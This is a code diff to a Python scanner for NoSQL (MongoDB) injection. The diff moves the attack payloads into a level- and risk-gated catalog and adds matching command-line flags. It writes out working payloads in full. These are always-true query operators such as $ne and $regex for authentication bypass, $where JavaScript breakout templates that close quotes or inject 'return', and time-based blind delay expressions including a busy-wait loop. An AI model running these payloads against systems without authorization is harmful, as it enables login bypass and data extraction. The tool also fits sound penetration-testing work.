@@ -15,6 +15,7 @@
 
 import difflib
 import json as _json
+import os
 import random
 import re
 import string
@@ -50,25 +51,67 @@ _TIME_WARN_STDEV = 0.50    # seconds; warn that the network is too jittery
 # Status codes that usually mean "blocked" (WAF/ratelimit), not injection.
 _BLOCKING = {403, 406, 429, 501}
 
-# $where field-value breakout templates.  One %s is filled with a JS boolean
-# expression ("true" for detection, a per-char test for extraction).
-_WHERE_TEMPLATES = [
-    ("sq-inline", "' || (%s) || '"),
-    ("dq-inline", "\" || (%s) || \""),
-    ("dq-eqeq", "\" || (%s) || \"\"==\""),
-    ("sq-eqeq", "' || (%s) || ''=='"),
-    ("sq-fn", "'; return (%s); var _d='"),
-    ("dq-fn", "\"; return (%s); var _d=\""),
-    ("bare", " || (%s) || "),
-]
+# Payload catalog.  Data-driven: loaded from data/payloads.json so operators and
+# $where breakout templates can be edited/extended without touching the engine;
+# falls back to this in-code copy if the file is missing.  Each entry carries a
+# 'level' so --level scales breadth.  "__RAND__" -> a fresh random at build time.
+_BUILTIN_CATALOG = {
+    "operators": [
+        {"label": "$ne:<rand>",   "op": {"$ne": "__RAND__"},        "level": 1, "risk": 1},
+        {"label": "$regex:.*",    "op": {"$regex": ".*"},           "level": 1, "risk": 1},
+        {"label": "$gt:''",       "op": {"$gt": ""},                "level": 1, "risk": 1},
+        {"label": "$ne:null",     "op": {"$ne": None},              "level": 2, "risk": 1},
+        {"label": "$gte:''",      "op": {"$gte": ""},               "level": 2, "risk": 1},
+        {"label": "$nin:[rand]",  "op": {"$nin": ["__RAND__"]},     "level": 2, "risk": 1},
+        {"label": "$exists:true", "op": {"$exists": True},          "level": 3, "risk": 1},
+        {"label": "$not/$regex",  "op": {"$not": {"$regex": "^$"}}, "level": 3, "risk": 2},
+    ],
+    "where_templates": [
+        {"label": "sq-inline", "tmpl": "' || (%s) || '",             "level": 1},
+        {"label": "dq-inline", "tmpl": "\" || (%s) || \"",           "level": 1},
+        {"label": "dq-eqeq",   "tmpl": "\" || (%s) || \"\"==\"",     "level": 2},
+        {"label": "sq-eqeq",   "tmpl": "' || (%s) || ''=='",         "level": 2},
+        {"label": "sq-fn",     "tmpl": "'; return (%s); var _d='",   "level": 3},
+        {"label": "dq-fn",     "tmpl": "\"; return (%s); var _d=\"", "level": 3},
+        {"label": "bare",      "tmpl": " || (%s) || ",               "level": 3},
+    ],
+    "delay_exprs": [
+        {"label": "sleep", "expr": "sleep(%d)"},
+        {"label": "busy",  "expr": "(function(){var _s=Date.now();while(Date.now()-_s<%d){}})()"},
+    ],
+}
 
-# Expressions that induce a measurable delay inside $where (for time-based blind
-# when there is no content signal).  sleep() is gentler; the busy-wait IIFE is
-# portable (works without MongoDB's sleep()).  Each takes a millisecond count.
-_DELAY_EXPRS = [
-    ("sleep", "sleep(%d)"),
-    ("busy", "(function(){var _s=Date.now();while(Date.now()-_s<%d){}})()"),
-]
+_CATALOG = None
+
+
+def _catalog():
+    global _CATALOG
+    if _CATALOG is None:
+        path = os.path.join(os.path.dirname(__file__), "data", "payloads.json")
+        try:
+            with open(path, encoding="utf-8") as f:
+                _CATALOG = _json.load(f)
+        except (OSError, ValueError):
+            _CATALOG = _BUILTIN_CATALOG
+    return _CATALOG
+
+
+def _de_rand(v):
+    if v == "__RAND__":
+        return _RANDV
+    if isinstance(v, list):
+        return [_de_rand(x) for x in v]
+    if isinstance(v, dict):
+        return {k: _de_rand(x) for k, x in v.items()}
+    return v
+
+
+def _where_templates(level=1):
+    return [(t["label"], t["tmpl"]) for t in _catalog()["where_templates"] if t.get("level", 1) <= level]
+
+
+def _delay_exprs():
+    return [(d["label"], d["expr"]) for d in _catalog()["delay_exprs"]]
 
 
 def args():
@@ -83,6 +126,8 @@ def args():
         ["--timeBased", "Time-based blind $where: auto (fall back when content has no signal), y (force), or n (off)"],
         ["--timeDelay", "Induced delay in milliseconds for time-based blind (default 1000)"],
         ["--noWhere", "Skip the $where JavaScript technique (y)"],
+        ["--level", "Payload breadth from the catalog: 1 (default, fast), 2, or 3 (widest set of operators/$where templates)"],
+        ["--risk", "Payload risk tier: 1 (default, safe), 2, or 3 (includes more intrusive operators)"],
         ["--csrfField", "Form field carrying an anti-CSRF token (carried, refreshed, on every request)"],
         ["--csrfUrl", "URL to GET a fresh CSRF token from (default: the target URL)"],
         ["--csrfRegex", "Regex with one capture group for the token (default: derived from --csrfField)"],
@@ -508,18 +553,11 @@ def _looks_like_error(p, noise):
     return any(h in low for h in _ERROR_HINTS) and p.length < noise.len_mean * 0.6
 
 
-def _op_specs():
-    # (label, {op: value}) -- every payload is ALWAYS-TRUE (matches any document).
-    return [
-        ("$ne:<rand>",   {"$ne": _RANDV}),
-        ("$ne:null",     {"$ne": None}),
-        ("$gt:''",       {"$gt": ""}),
-        ("$gte:''",      {"$gte": ""}),
-        ("$regex:.*",    {"$regex": ".*"}),
-        ("$nin:[rand]",  {"$nin": [_RANDV]}),
-        ("$exists:true", {"$exists": True}),
-        ("$not/$regex",  {"$not": {"$regex": "^$"}}),
-    ]
+def _op_specs(level=1, risk=1):
+    # (label, {op: value}) from the catalog, gated by --level/--risk; every
+    # payload is ALWAYS-TRUE (matches any document).
+    return [(o["label"], _de_rand(o["op"])) for o in _catalog()["operators"]
+            if o.get("level", 1) <= level and o.get("risk", 1) <= risk]
 
 
 def _resolve(v):
@@ -536,31 +574,32 @@ def _resolve_ops(opdict):
     return {k: _resolve(v) for k, v in opdict.items()}
 
 
-def _candidates(fields_literal, inject_fields=None):
+def _candidates(fields_literal, inject_fields=None, level=1, risk=1):
     names = list(fields_literal.keys())
     cands = []
+    ops = _op_specs(level, risk)
     # A) auth-bypass: always-true operator on EVERY field at once -- only when
     #    auto-enumerating; a pinned '*' marker means "inject exactly here".
     if not inject_fields:
-        for lbl, od in _op_specs():
+        for lbl, od in ops:
             spec = {n: ("ops", _resolve_ops(od)) for n in names}
             cands.append(("all-fields %s" % lbl, spec, None))
     # B) single-field operator (data endpoints like ?id=5 -> id[$ne], or marker).
     targets = inject_fields or (names if len(names) > 1 else [])
     for f in targets:
-        for lbl, od in _op_specs():
+        for lbl, od in ops:
             spec = {n: ("lit", fields_literal[n]) for n in names}
             spec[f] = ("ops", _resolve_ops(od))
             cands.append(("%s %s" % (f, lbl), spec, None))
     return cands
 
 
-def _where_candidates(fields_literal, inject_fields=None):
+def _where_candidates(fields_literal, inject_fields=None, level=1):
     names = list(fields_literal.keys())
     targets = inject_fields or names
     cands = []
     for f in targets:
-        for tlabel, tmpl in _WHERE_TEMPLATES:
+        for tlabel, tmpl in _where_templates(level):
             spec = {n: ("lit", fields_literal[n]) for n in names}
             spec[f] = ("lit", tmpl % "true")
             cands.append(("$where %s/%s" % (f, tlabel), spec, {"field": f, "template": tmpl}))
@@ -583,7 +622,7 @@ def _calibrate_dynamic(ctx, method, base_url, vector, fields_literal):
 
 def detect(base_url, method, fields_literal, headers=None, verify=False,
            csrf=None, no_where=False, ctx=None, time_based="auto", delay_ms=1000,
-           inject_fields=None, vectors=None):
+           inject_fields=None, vectors=None, level=1, risk=1):
     method = method.upper()
     if ctx is None:
         ctx = Ctx(headers, verify, csrf)
@@ -602,9 +641,9 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
             continue
         noise = Noise(falses)
 
-        cands = _candidates(fields_literal, inject_fields)
+        cands = _candidates(fields_literal, inject_fields, level, risk)
         if not no_where:
-            cands = cands + _where_candidates(fields_literal, inject_fields)
+            cands = cands + _where_candidates(fields_literal, inject_fields, level)
 
         for label, spec, meta in cands:
             try:
@@ -635,7 +674,7 @@ def detect(base_url, method, fields_literal, headers=None, verify=False,
     has_where = any(f["strong"] and isinstance(f.get("where"), dict) and not f["where"].get("time")
                     for f in findings)
     if not no_where and (time_based == "y" or (time_based == "auto" and not has_where)):
-        findings += _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields)
+        findings += _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields, level)
     return findings
 
 
@@ -1059,7 +1098,7 @@ def _time_threshold(times, delay_secs):
     return m + margin
 
 
-def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields=None):
+def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields=None, level=1):
     # Confirm a $where injection purely by response time: inject an unconditional
     # delay; if it slows (and a no-delay control stays fast), it's time-based.
     secs = delay_ms / 1000.0
@@ -1073,8 +1112,8 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, injec
         thr = _time_threshold(base, secs)
         bmean = sum(base) / len(base)
         for field in targets:
-            for tlabel, tmpl in _WHERE_TEMPLATES:
-                for elabel, efmt in _DELAY_EXPRS:
+            for tlabel, tmpl in _where_templates(level):
+                for elabel, efmt in _delay_exprs():
                     spec = {n: ("lit", fields_literal[n]) for n in fields_literal}
                     spec[field] = ("lit", tmpl % (efmt % delay_ms))
                     try:
@@ -1286,6 +1325,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
     delay_ms = 1000
     proxy = None
     retries = 2
+    level = 1
+    risk = 1
     a_true = a_false = a_regex = a_code = None
     if args is not None:
         cf = getattr(args, "csrfField", None)
@@ -1304,6 +1345,14 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
             retries = int(getattr(args, "retries", None) or 2)
         except (ValueError, TypeError):
             retries = 2
+        try:
+            level = max(1, min(3, int(getattr(args, "level", None) or 1)))
+        except (ValueError, TypeError):
+            level = 1
+        try:
+            risk = max(1, min(3, int(getattr(args, "risk", None) or 1)))
+        except (ValueError, TypeError):
+            risk = 1
         a_true = getattr(args, "trueString", None)
         a_false = getattr(args, "falseString", None)
         a_regex = getattr(args, "trueRegex", None)
@@ -1317,6 +1366,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
     print("=================================================================")
     print("Target: %s [%s]" % (base_url, method.upper()))
     print("Fields: %s" % (", ".join(fields_literal.keys()) or "(none)"))
+    if level > 1 or risk > 1:
+        print("Level : %d  Risk: %d  (payload breadth from catalog)" % (level, risk))
     if inject_fields:
         print("Inject: %s (pinned marker)" % ", ".join(inject_fields))
     if csrf:
@@ -1334,7 +1385,8 @@ def run(base_url, method, fields_literal, headers=None, verify=False, args=None,
               assert_true=a_true, assert_false=a_false, assert_regex=a_regex, assert_code=a_code)
     findings = detect(base_url, method, fields_literal, no_where=no_where, ctx=ctx,
                       time_based=time_based, delay_ms=delay_ms,
-                      inject_fields=inject_fields, vectors=vectors)
+                      inject_fields=inject_fields, vectors=vectors,
+                      level=level, risk=risk)
 
     print("")
     strong_all = [f for f in findings if f["strong"]]
